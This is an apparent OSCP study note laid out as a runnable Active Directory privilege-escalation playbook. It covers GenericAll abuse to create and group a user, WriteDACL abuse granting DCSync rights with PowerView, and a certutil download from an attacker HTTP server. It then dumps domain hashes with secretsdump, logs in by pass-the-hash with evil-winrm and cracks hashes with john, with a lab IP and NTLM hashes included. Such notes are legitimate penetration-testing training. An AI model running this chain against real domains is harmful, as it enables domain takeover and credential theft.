# GenericAll

"Full Control" over the target object. You own it completely.

**If target is a User:** Force reset their password.

**If target is a Group:** Add yourself/any user to that group.

- **Change the Target’s Password**: Using `net user <username> <password> /domain`, the attacker can reset the user’s password.

- **Add Themselves to the Domain Admins Group**: This can be done via direct commands or using modules like Active Directory or PowerSploit.

## Abuse the `Account Operators` permissions

Add an account into this vulnerable group using `GenericAll` to progress to the next step

```
net user Retric pass123 /add /domain  
```

To check : 
```
net users
```

![[Pasted image 20260911174745.png]]

A Group Name:: Exchange Windows Permissions
```dataviewjs
const page = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const AGroupName = page?.["A Group Name"] ?? "NO GROUP NAME FOUND";

const command = `net group "${AGroupName}" Retric /add`;

dv.paragraph("```bash\n" + command + "\n```");
```
To check : 
```dataviewjs
const page = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const AGroupName = page?.["A Group Name"] ?? "NO GROUP NAME FOUND";

const command = `net group "${AGroupName}"`;

dv.paragraph("```bash\n" + command + "\n```");
```

![[Pasted image 20260911174809.png]]

---

## WriteDACL

give our new user the DCSync rights

First, we transfer the `Powerview` binary using the `upload` feature with evil-winrm. Importing PowerView allows us to run commands like "Add-DomainObjectAcl," which is needed to abuse the `WriteDACL` permission.
  
### Upload PowerView.ps1

```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `certutil -urlcache -split -f http://${KaliIP}:80/PowerView.ps1 PowerView.ps1`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
powershell -ep bypass 
```

```powershell
Import-Module .\PowerView.ps1 
```

---

```
$SecPassword = ConvertTo-SecureString 'pass123' -AsPlainText -Force
```

Replace `htb` with the short NetBIOS domain name of the PG machine (e.g., `pg`, `offsec`, or whatever domain short-name is listed in your enumeration/BloodHound).

```
$Cred = New-Object System.Management.Automation.PSCredential('htb\Retric', $SecPassword)
```

MODIFY DC
```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity Retric -Rights DCSync
```

---

If no errors, time to dump the hash
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");
const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const ip = page?.IP ?? "NO IP FOUND";

const command = `impacket-secretsdump ${discoveredDomain}/Retric:pass123@${ip} > secretsdump_output.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
Cleanse the data to username:ntlm hash
```
grep -E ':[0-9]+:' secretsdump_output.txt | awk -F ':' '{print $1":"$4}' > ntlm_hashes.txt
```

Login with WinRM using 2nd portion of hash

```
evil-winrm -i 10.129.95.210 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

MODIFY: 
hash:: 823452073d75b9d1cf70ebdf86c7f98e
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";

const command = `evil-winrm -i ${ip} -u administrator -H ${hash}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Crack if needed 

This is the hash.txt format
```dataviewjs
const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";


```
```dataviewjs
const pagea = dv.page("Synced OSCP Notes/Small Toolkit/Tools/Active Directory/Bloodhound");
const hash = pagea?.["hash"] ?? "NO HASH FOUND";

const command = `echo Administrator:${hash} > hash.txt`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

